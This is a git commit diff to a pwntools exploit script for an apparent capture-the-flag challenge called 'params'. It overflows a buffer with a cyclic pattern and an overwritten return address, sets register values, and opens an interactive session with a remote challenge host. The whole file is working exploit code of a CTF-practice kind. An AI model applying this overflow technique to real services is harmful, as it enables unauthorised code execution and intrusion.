162c1db88068d68aba1c5d317e76efe191927519
condor0010 <liatmp3@gmail.com>
2022-06-30 21:26:59 -0400

    aaa vs aaaa in rizin is important

--- Params/params.py
+++ Params/params.py
@@ -1,29 +1,33 @@
 #!/bin/python
 from pwn import *
-target = process("./params")
+
+#target = process("./params")
+
+target = remote("forever.isss.io", 1304)
 
 print(target.recvline()) # hey bb
 print(target.recvline()) # whats ur name
 
 target.sendline(cyclic(73)+p64(0x401354)) # jump to 0x0000000000401354
-#target.sendline(cyclic(120)+p64(0x4011c7))
 
 print("overwrote return adress")
 
 print(target.recvline()) # hello $NAME
 print(target.recvline()) # you can set my registers any day of the week
 
-target.recvuntil(":")
 
-target.sendline(b"59") # rax | 59 is execve
-target.sendline(b"0") # rbx | asume value is unimportant?
-target.sendline(b"0") # rcx | asume value is unimportant?
-target.sendline(b"0") # rdx | asume value is unimportant?
-target.sendline(p64(0x00401017)) # rsi | from ex bin
-target.sendline(p64(0x0040103f)) # rdi | from ex bin
-
+target.sendline( b'0' ) # rax 
+target.sendline( b'0' ) # rbx
+target.sendline(p64(4)) # rcx
+target.sendline(p64(0xdeadbeef) ) # rdx
+target.sendline(p64(0xcafebabe) ) # rsi
+target.sendline(p64(0x1337) ) # rdi
 
 
+target.interactive()
 
 
-
+# rdi | arg1 | 0x1337
+# rsi | arg2 | 0xcafebabe
+# rdx | arg3 | 0xdeadbeef
+# rcx | arg4 | 4
